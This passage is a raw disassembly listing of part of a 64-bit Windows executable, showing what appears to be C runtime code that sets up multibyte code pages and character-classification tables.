   140006589:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   14000658d:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140006591:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140006595:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140006599:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   14000659d:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400065a1:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400065a5:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1400065a9:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1400065ad:	48 03 ca             	add    %rdx,%rcx
   1400065b0:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400065b4:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1400065b8:	48 03 c2             	add    %rdx,%rax
   1400065bb:	49 83 e8 01          	sub    $0x1,%r8
   1400065bf:	75 b6                	jne    0x140006577
   1400065c1:	eb 1d                	jmp    0x1400065e0
   1400065c3:	33 d2                	xor    %edx,%edx
   1400065c5:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1400065cb:	e8 b0 c3 ff ff       	call   0x140002980
   1400065d0:	e8 eb f1 ff ff       	call   0x1400057c0
   1400065d5:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400065db:	e8 c0 f0 ff ff       	call   0x1400056a0
   1400065e0:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400065e4:	48 8b 08             	mov    (%rax),%rcx
   1400065e7:	48 8b 11             	mov    (%rcx),%rdx
   1400065ea:	83 c8 ff             	or     $0xffffffff,%eax
   1400065ed:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   1400065f1:	83 f8 01             	cmp    $0x1,%eax
   1400065f4:	75 1b                	jne    0x140006611
   1400065f6:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400065fa:	48 8b 08             	mov    (%rax),%rcx
   1400065fd:	48 8d 05 5c 0a 01 00 	lea    0x10a5c(%rip),%rax        # 0x140017060
   140006604:	48 39 01             	cmp    %rax,(%rcx)
   140006607:	74 08                	je     0x140006611
   140006609:	48 8b 09             	mov    (%rcx),%rcx
   14000660c:	e8 47 f2 ff ff       	call   0x140005858
   140006611:	48 8b 03             	mov    (%rbx),%rax
   140006614:	48 8b 10             	mov    (%rax),%rdx
   140006617:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000661b:	48 8b 08             	mov    (%rax),%rcx
   14000661e:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140006625:	48 89 01             	mov    %rax,(%rcx)
   140006628:	48 8b 03             	mov    (%rbx),%rax
   14000662b:	48 8b 08             	mov    (%rax),%rcx
   14000662e:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006635:	f0 ff 00             	lock incl (%rax)
   140006638:	8b 0f                	mov    (%rdi),%ecx
   14000663a:	e8 f9 0f 00 00       	call   0x140007638
   14000663f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006644:	48 83 c4 20          	add    $0x20,%rsp
   140006648:	5f                   	pop    %rdi
   140006649:	c3                   	ret
   14000664a:	cc                   	int3
   14000664b:	cc                   	int3
   14000664c:	40 53                	rex push %rbx
   14000664e:	48 83 ec 40          	sub    $0x40,%rsp
   140006652:	8b d9                	mov    %ecx,%ebx
   140006654:	33 d2                	xor    %edx,%edx
   140006656:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000665b:	e8 b4 e6 ff ff       	call   0x140004d14
   140006660:	83 25 99 17 01 00 00 	andl   $0x0,0x11799(%rip)        # 0x140017e00
   140006667:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000666a:	75 12                	jne    0x14000667e
   14000666c:	c7 05 8a 17 01 00 01 	movl   $0x1,0x1178a(%rip)        # 0x140017e00
   140006673:	00 00 00 
   140006676:	ff 15 fc 7a 00 00    	call   *0x7afc(%rip)        # 0x14000e178
   14000667c:	eb 15                	jmp    0x140006693
   14000667e:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140006681:	75 14                	jne    0x140006697
   140006683:	c7 05 73 17 01 00 01 	movl   $0x1,0x11773(%rip)        # 0x140017e00
   14000668a:	00 00 00 
   14000668d:	ff 15 dd 7a 00 00    	call   *0x7add(%rip)        # 0x14000e170
   140006693:	8b d8                	mov    %eax,%ebx
   140006695:	eb 17                	jmp    0x1400066ae
   140006697:	83 fb fc             	cmp    $0xfffffffc,%ebx
   14000669a:	75 12                	jne    0x1400066ae
   14000669c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400066a1:	c7 05 55 17 01 00 01 	movl   $0x1,0x11755(%rip)        # 0x140017e00
   1400066a8:	00 00 00 
   1400066ab:	8b 58 0c             	mov    0xc(%rax),%ebx
   1400066ae:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1400066b3:	74 0c                	je     0x1400066c1
   1400066b5:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1400066ba:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   1400066c1:	8b c3                	mov    %ebx,%eax
   1400066c3:	48 83 c4 40          	add    $0x40,%rsp
   1400066c7:	5b                   	pop    %rbx
   1400066c8:	c3                   	ret
   1400066c9:	cc                   	int3
   1400066ca:	cc                   	int3
   1400066cb:	cc                   	int3
   1400066cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400066d1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400066d6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400066db:	57                   	push   %rdi
   1400066dc:	48 83 ec 20          	sub    $0x20,%rsp
   1400066e0:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   1400066e4:	48 8b f1             	mov    %rcx,%rsi
   1400066e7:	bd 01 01 00 00       	mov    $0x101,%ebp
   1400066ec:	48 8b cb             	mov    %rbx,%rcx
   1400066ef:	44 8b c5             	mov    %ebp,%r8d
   1400066f2:	33 d2                	xor    %edx,%edx
   1400066f4:	e8 87 c2 ff ff       	call   0x140002980
   1400066f9:	33 c0                	xor    %eax,%eax
   1400066fb:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   1400066ff:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140006703:	b9 06 00 00 00       	mov    $0x6,%ecx
   140006708:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   14000670f:	0f b7 c0             	movzwl %ax,%eax
   140006712:	66 f3 ab             	rep stos %ax,(%rdi)
   140006715:	48 8d 3d 44 09 01 00 	lea    0x10944(%rip),%rdi        # 0x140017060
   14000671c:	48 2b fe             	sub    %rsi,%rdi
   14000671f:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   140006722:	88 03                	mov    %al,(%rbx)
   140006724:	48 ff c3             	inc    %rbx
   140006727:	48 83 ed 01          	sub    $0x1,%rbp
   14000672b:	75 f2                	jne    0x14000671f
   14000672d:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   140006734:	ba 00 01 00 00       	mov    $0x100,%edx
   140006739:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   14000673c:	88 01                	mov    %al,(%rcx)
   14000673e:	48 ff c1             	inc    %rcx
   140006741:	48 83 ea 01          	sub    $0x1,%rdx
   140006745:	75 f2                	jne    0x140006739
   140006747:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000674c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006751:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006756:	48 83 c4 20          	add    $0x20,%rsp
   14000675a:	5f                   	pop    %rdi
   14000675b:	c3                   	ret
   14000675c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006761:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006766:	55                   	push   %rbp
   140006767:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   14000676e:	ff 
   14000676f:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   140006776:	48 8b 05 ab 08 01 00 	mov    0x108ab(%rip),%rax        # 0x140017028
   14000677d:	48 33 c4             	xor    %rsp,%rax
   140006780:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   140006787:	48 8b d9             	mov    %rcx,%rbx
   14000678a:	8b 49 04             	mov    0x4(%rcx),%ecx
   14000678d:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140006793:	0f 84 3d 01 00 00    	je     0x1400068d6
   140006799:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000679e:	ff 15 dc 79 00 00    	call   *0x79dc(%rip)        # 0x14000e180
   1400067a4:	85 c0                	test   %eax,%eax
   1400067a6:	0f 84 2a 01 00 00    	je     0x1400068d6
   1400067ac:	33 c0                	xor    %eax,%eax
   1400067ae:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400067b3:	be 00 01 00 00       	mov    $0x100,%esi
   1400067b8:	88 01                	mov    %al,(%rcx)
   1400067ba:	ff c0                	inc    %eax
   1400067bc:	48 ff c1             	inc    %rcx
   1400067bf:	3b c6                	cmp    %esi,%eax
   1400067c1:	72 f5                	jb     0x1400067b8
   1400067c3:	8a 44 24 56          	mov    0x56(%rsp),%al
   1400067c7:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   1400067cc:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   1400067d1:	eb 20                	jmp    0x1400067f3
   1400067d3:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   1400067d8:	0f b6 c8             	movzbl %al,%ecx
   1400067db:	eb 0b                	jmp    0x1400067e8
   1400067dd:	3b ce                	cmp    %esi,%ecx
   1400067df:	73 0c                	jae    0x1400067ed
   1400067e1:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   1400067e6:	ff c1                	inc    %ecx
   1400067e8:	41 3b c8             	cmp    %r8d,%ecx
   1400067eb:	76 f0                	jbe    0x1400067dd
   1400067ed:	48 83 c2 02          	add    $0x2,%rdx
   1400067f1:	8a 02                	mov    (%rdx),%al
   1400067f3:	84 c0                	test   %al,%al
   1400067f5:	75 dc                	jne    0x1400067d3
   1400067f7:	8b 43 04             	mov    0x4(%rbx),%eax
   1400067fa:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400067ff:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140006804:	44 8b ce             	mov    %esi,%r9d
   140006807:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000680b:	ba 01 00 00 00       	mov    $0x1,%edx
   140006810:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   140006817:	33 c9                	xor    %ecx,%ecx
   140006819:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000681e:	e8 8d 17 00 00       	call   0x140007fb0
   140006823:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140006828:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   14000682d:	8b 43 04             	mov    0x4(%rbx),%eax
   140006830:	44 8b c6             	mov    %esi,%r8d
   140006833:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   14000683a:	33 c9                	xor    %ecx,%ecx
   14000683c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140006840:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140006844:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140006848:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000684d:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140006851:	e8 56 3b 00 00       	call   0x14000a3ac
   140006856:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   14000685b:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140006860:	8b 43 04             	mov    0x4(%rbx),%eax
   140006863:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140006869:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   140006870:	33 c9                	xor    %ecx,%ecx
   140006872:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140006876:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   14000687d:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140006881:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006886:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000688a:	e8 1d 3b 00 00       	call   0x14000a3ac
   14000688f:	b8 01 00 00 00       	mov    $0x1,%eax
   140006894:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   14000689b:	f6 02 01             	testb  $0x1,(%rdx)
   14000689e:	74 0b                	je     0x1400068ab
   1400068a0:	80 4c 18 18 10       	orb    $0x10,0x18(%rax,%rbx,1)
   1400068a5:	8a 4c 05 6f          	mov    0x6f(%rbp,%rax,1),%cl
   1400068a9:	eb 15                	jmp    0x1400068c0
   1400068ab:	f6 02 02             	testb  $0x2,(%rdx)
   1400068ae:	74 0e                	je     0x1400068be
   1400068b0:	80 4c 18 18 20       	orb    $0x20,0x18(%rax,%rbx,1)
   1400068b5:	8a 8c 05 6f 01 00 00 	mov    0x16f(%rbp,%rax,1),%cl
   1400068bc:	eb 02                	jmp    0x1400068c0
   1400068be:	32 c9                	xor    %cl,%cl
   1400068c0:	88 8c 18 18 01 00 00 	mov    %cl,0x118(%rax,%rbx,1)
   1400068c7:	48 83 c2 02          	add    $0x2,%rdx
   1400068cb:	48 ff c0             	inc    %rax
   1400068ce:	48 83 ee 01          	sub    $0x1,%rsi
   1400068d2:	75 c7                	jne    0x14000689b
   1400068d4:	eb 43                	jmp    0x140006919
   1400068d6:	33 d2                	xor    %edx,%edx
   1400068d8:	be 00 01 00 00       	mov    $0x100,%esi
   1400068dd:	8d 4a 01             	lea    0x1(%rdx),%ecx
   1400068e0:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   1400068e4:	41 8d 40 20          	lea    0x20(%r8),%eax
   1400068e8:	83 f8 19             	cmp    $0x19,%eax
   1400068eb:	77 0a                	ja     0x1400068f7
   1400068ed:	80 4c 0b 18 10       	orb    $0x10,0x18(%rbx,%rcx,1)
   1400068f2:	8d 42 20             	lea    0x20(%rdx),%eax
   1400068f5:	eb 12                	jmp    0x140006909
   1400068f7:	41 83 f8 19          	cmp    $0x19,%r8d
   1400068fb:	77 0a                	ja     0x140006907
   1400068fd:	80 4c 0b 18 20       	orb    $0x20,0x18(%rbx,%rcx,1)
   140006902:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140006905:	eb 02                	jmp    0x140006909
   140006907:	32 c0                	xor    %al,%al
   140006909:	88 84 0b 18 01 00 00 	mov    %al,0x118(%rbx,%rcx,1)
   140006910:	ff c2                	inc    %edx
   140006912:	48 ff c1             	inc    %rcx
   140006915:	3b d6                	cmp    %esi,%edx
   140006917:	72 c7                	jb     0x1400068e0
   140006919:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   140006920:	48 33 cc             	xor    %rsp,%rcx
   140006923:	e8 c8 6a 00 00       	call   0x14000d3f0
   140006928:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   14000692f:	00 
   140006930:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140006934:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140006938:	49 8b e3             	mov    %r11,%rsp
   14000693b:	5d                   	pop    %rbp
   14000693c:	c3                   	ret
   14000693d:	cc                   	int3
   14000693e:	cc                   	int3
   14000693f:	cc                   	int3
   140006940:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006945:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000694a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000694f:	55                   	push   %rbp
   140006950:	56                   	push   %rsi
   140006951:	57                   	push   %rdi
   140006952:	48 8b ec             	mov    %rsp,%rbp
   140006955:	48 83 ec 40          	sub    $0x40,%rsp
   140006959:	40 8a f2             	mov    %dl,%sil
   14000695c:	8b d9                	mov    %ecx,%ebx
   14000695e:	49 8b d1             	mov    %r9,%rdx
   140006961:	49 8b c8             	mov    %r8,%rcx
   140006964:	e8 97 01 00 00       	call   0x140006b00
   140006969:	8b cb                	mov    %ebx,%ecx
   14000696b:	e8 dc fc ff ff       	call   0x14000664c
   140006970:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140006974:	8b f8                	mov    %eax,%edi
   140006976:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   14000697d:	41 3b 40 04          	cmp    0x4(%r8),%eax
   140006981:	75 07                	jne    0x14000698a
   140006983:	33 c0                	xor    %eax,%eax
   140006985:	e9 b8 00 00 00       	jmp    0x140006a42
   14000698a:	b9 28 02 00 00       	mov    $0x228,%ecx
   14000698f:	e8 bc 15 00 00       	call   0x140007f50
   140006994:	48 8b d8             	mov    %rax,%rbx
   140006997:	48 85 c0             	test   %rax,%rax
   14000699a:	0f 84 95 00 00 00    	je     0x140006a35
   1400069a0:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400069a4:	ba 04 00 00 00       	mov    $0x4,%edx
   1400069a9:	48 8b cb             	mov    %rbx,%rcx
   1400069ac:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   1400069b3:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   1400069b7:	0f 10 00             	movups (%rax),%xmm0
   1400069ba:	0f 11 01             	movups %xmm0,(%rcx)
   1400069bd:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400069c1:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400069c5:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1400069c9:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1400069cd:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   1400069d1:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   1400069d5:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1400069d9:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   1400069dd:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400069e1:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400069e5:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1400069e9:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1400069ed:	49 03 c8             	add    %r8,%rcx
   1400069f0:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400069f4:	49 03 c0             	add    %r8,%rax
   1400069f7:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1400069fb:	48 83 ea 01          	sub    $0x1,%rdx
   1400069ff:	75 b6                	jne    0x1400069b7
   140006a01:	0f 10 00             	movups (%rax),%xmm0
   140006a04:	0f 11 01             	movups %xmm0,(%rcx)
   140006a07:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140006a0b:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140006a0f:	48 8b 40 20          	mov    0x20(%rax),%rax
   140006a13:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140006a17:	8b cf                	mov    %edi,%ecx
   140006a19:	21 13                	and    %edx,(%rbx)
   140006a1b:	48 8b d3             	mov    %rbx,%rdx
   140006a1e:	e8 11 02 00 00       	call   0x140006c34
   140006a23:	8b f8                	mov    %eax,%edi
   140006a25:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006a28:	75 25                	jne    0x140006a4f
   140006a2a:	e8 91 ed ff ff       	call   0x1400057c0
   140006a2f:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006a35:	83 cf ff             	or     $0xffffffff,%edi
   140006a38:	48 8b cb             	mov    %rbx,%rcx
   140006a3b:	e8 18 ee ff ff       	call   0x140005858
   140006a40:	8b c7                	mov    %edi,%eax
   140006a42:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006a47:	48 83 c4 40          	add    $0x40,%rsp
   140006a4b:	5f                   	pop    %rdi
   140006a4c:	5e                   	pop    %rsi
   140006a4d:	5d                   	pop    %rbp
   140006a4e:	c3                   	ret
   140006a4f:	40 84 f6             	test   %sil,%sil
   140006a52:	75 05                	jne    0x140006a59
   140006a54:	e8 6f db ff ff       	call   0x1400045c8
   140006a59:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006a5d:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140006a64:	83 c8 ff             	or     $0xffffffff,%eax
   140006a67:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140006a6b:	83 f8 01             	cmp    $0x1,%eax
   140006a6e:	75 1c                	jne    0x140006a8c
   140006a70:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006a74:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140006a7b:	48 8d 05 de 05 01 00 	lea    0x105de(%rip),%rax        # 0x140017060
   140006a82:	48 3b c8             	cmp    %rax,%rcx
   140006a85:	74 05                	je     0x140006a8c
   140006a87:	e8 cc ed ff ff       	call   0x140005858
   140006a8c:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140006a92:	48 8b cb             	mov    %rbx,%rcx
   140006a95:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006a99:	33 db                	xor    %ebx,%ebx
   140006a9b:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   140006aa2:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006aa6:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   140006aac:	85 0d fe 0c 01 00    	test   %ecx,0x10cfe(%rip)        # 0x1400177b0
   140006ab2:	75 84                	jne    0x140006a38
   140006ab4:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140006ab8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006abc:	4c 8d 4d e4          	lea    -0x1c(%rbp),%r9
   140006ac0:	48 8d 45 38          	lea    0x38(%rbp),%rax
   140006ac4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140006ac8:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140006acc:	8d 43 05             	lea    0x5(%rbx),%eax
   140006acf:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140006ad3:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140006ad6:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140006ada:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140006add:	e8 ae f9 ff ff       	call   0x140006490
   140006ae2:	40 84 f6             	test   %sil,%sil
   140006ae5:	0f 84 4d ff ff ff    	je     0x140006a38
   140006aeb:	48 8b 45 38          	mov    0x38(%rbp),%rax
   140006aef:	48 8b 08             	mov    (%rax),%rcx
   140006af2:	48 89 0d 07 0c 01 00 	mov    %rcx,0x10c07(%rip)        # 0x140017700
   140006af9:	e9 3a ff ff ff       	jmp    0x140006a38
   140006afe:	cc                   	int3
   140006aff:	cc                   	int3
   140006b00:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006b05:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006b0a:	57                   	push   %rdi
   140006b0b:	48 83 ec 20          	sub    $0x20,%rsp
   140006b0f:	48 8b f2             	mov    %rdx,%rsi
   140006b12:	48 8b f9             	mov    %rcx,%rdi
   140006b15:	8b 05 95 0c 01 00    	mov    0x10c95(%rip),%eax        # 0x1400177b0
   140006b1b:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   140006b21:	74 13                	je     0x140006b36
   140006b23:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   140006b2a:	00 
   140006b2b:	74 09                	je     0x140006b36
   140006b2d:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   140006b34:	eb 64                	jmp    0x140006b9a
   140006b36:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006b3b:	e8 a4 0a 00 00       	call   0x1400075e4
   140006b40:	90                   	nop
   140006b41:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140006b48:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006b4d:	48 3b 1e             	cmp    (%rsi),%rbx
   140006b50:	74 3e                	je     0x140006b90
   140006b52:	48 85 db             	test   %rbx,%rbx
   140006b55:	74 22                	je     0x140006b79
   140006b57:	83 c8 ff             	or     $0xffffffff,%eax
   140006b5a:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   140006b5e:	83 f8 01             	cmp    $0x1,%eax
   140006b61:	75 16                	jne    0x140006b79
   140006b63:	48 8d 05 f6 04 01 00 	lea    0x104f6(%rip),%rax        # 0x140017060
   140006b6a:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006b6f:	48 3b c8             	cmp    %rax,%rcx
   140006b72:	74 05                	je     0x140006b79
   140006b74:	e8 df ec ff ff       	call   0x140005858
   140006b79:	48 8b 06             	mov    (%rsi),%rax
   140006b7c:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   140006b83:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006b88:	f0 ff 00             	lock incl (%rax)
   140006b8b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006b90:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006b95:	e8 9e 0a 00 00       	call   0x140007638
   140006b9a:	48 85 db             	test   %rbx,%rbx
   140006b9d:	74 13                	je     0x140006bb2
   140006b9f:	48 8b c3             	mov    %rbx,%rax
   140006ba2:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006ba7:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006bac:	48 83 c4 20          	add    $0x20,%rsp
   140006bb0:	5f                   	pop    %rdi
   140006bb1:	c3                   	ret
   140006bb2:	e8 89 e0 ff ff       	call   0x140004c40
   140006bb7:	90                   	nop
   140006bb8:	48 83 ec 28          	sub    $0x28,%rsp
   140006bbc:	80 3d 41 12 01 00 00 	cmpb   $0x0,0x11241(%rip)        # 0x140017e04
   140006bc3:	75 4c                	jne    0x140006c11
   140006bc5:	48 8d 0d d4 07 01 00 	lea    0x107d4(%rip),%rcx        # 0x1400173a0
   140006bcc:	48 89 0d 1d 12 01 00 	mov    %rcx,0x1121d(%rip)        # 0x140017df0
   140006bd3:	48 8d 05 86 04 01 00 	lea    0x10486(%rip),%rax        # 0x140017060
   140006bda:	48 8d 0d af 06 01 00 	lea    0x106af(%rip),%rcx        # 0x140017290
   140006be1:	48 89 05 10 12 01 00 	mov    %rax,0x11210(%rip)        # 0x140017df8
   140006be8:	48 89 0d f9 11 01 00 	mov    %rcx,0x111f9(%rip)        # 0x140017de8
   140006bef:	e8 c4 e6 ff ff       	call   0x1400052b8
   140006bf4:	4c 8d 0d fd 11 01 00 	lea    0x111fd(%rip),%r9        # 0x140017df8
   140006bfb:	4c 8b c0             	mov    %rax,%r8
   140006bfe:	b2 01                	mov    $0x1,%dl
   140006c00:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   140006c05:	e8 36 fd ff ff       	call   0x140006940
   140006c0a:	c6 05 f3 11 01 00 01 	movb   $0x1,0x111f3(%rip)        # 0x140017e04
   140006c11:	b0 01                	mov    $0x1,%al
   140006c13:	48 83 c4 28          	add    $0x28,%rsp
   140006c17:	c3                   	ret
   140006c18:	48 83 ec 28          	sub    $0x28,%rsp
   140006c1c:	e8 c3 e5 ff ff       	call   0x1400051e4
   140006c21:	48 8b c8             	mov    %rax,%rcx
   140006c24:	48 8d 15 cd 11 01 00 	lea    0x111cd(%rip),%rdx        # 0x140017df8
   140006c2b:	48 83 c4 28          	add    $0x28,%rsp
   140006c2f:	e9 cc fe ff ff       	jmp    0x140006b00
   140006c34:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006c39:	55                   	push   %rbp
   140006c3a:	56                   	push   %rsi
   140006c3b:	57                   	push   %rdi
   140006c3c:	41 54                	push   %r12
   140006c3e:	41 55                	push   %r13
   140006c40:	41 56                	push   %r14
   140006c42:	41 57                	push   %r15
   140006c44:	48 83 ec 40          	sub    $0x40,%rsp
   140006c48:	48 8b 05 d9 03 01 00 	mov    0x103d9(%rip),%rax        # 0x140017028
   140006c4f:	48 33 c4             	xor    %rsp,%rax
   140006c52:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006c57:	48 8b f2             	mov    %rdx,%rsi
   140006c5a:	e8 ed f9 ff ff       	call   0x14000664c
   140006c5f:	33 db                	xor    %ebx,%ebx
   140006c61:	8b f8                	mov    %eax,%edi
   140006c63:	85 c0                	test   %eax,%eax
   140006c65:	0f 84 53 02 00 00    	je     0x140006ebe
   140006c6b:	4c 8d 2d 3e 08 01 00 	lea    0x1083e(%rip),%r13        # 0x1400174b0
   140006c72:	44 8b f3             	mov    %ebx,%r14d
   140006c75:	49 8b c5             	mov    %r13,%rax
   140006c78:	8d 6b 01             	lea    0x1(%rbx),%ebp
   140006c7b:	39 38                	cmp    %edi,(%rax)
   140006c7d:	0f 84 4e 01 00 00    	je     0x140006dd1
   140006c83:	44 03 f5             	add    %ebp,%r14d
   140006c86:	48 83 c0 30          	add    $0x30,%rax
   140006c8a:	41 83 fe 05          	cmp    $0x5,%r14d
   140006c8e:	72 eb                	jb     0x140006c7b
   140006c90:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   140006c96:	0f 84 2d 01 00 00    	je     0x140006dc9
   140006c9c:	0f b7 cf             	movzwl %di,%ecx
   140006c9f:	ff 15 c3 74 00 00    	call   *0x74c3(%rip)        # 0x14000e168
   140006ca5:	85 c0                	test   %eax,%eax
   140006ca7:	0f 84 1c 01 00 00    	je     0x140006dc9
   140006cad:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   140006cb2:	3b f8                	cmp    %eax,%edi
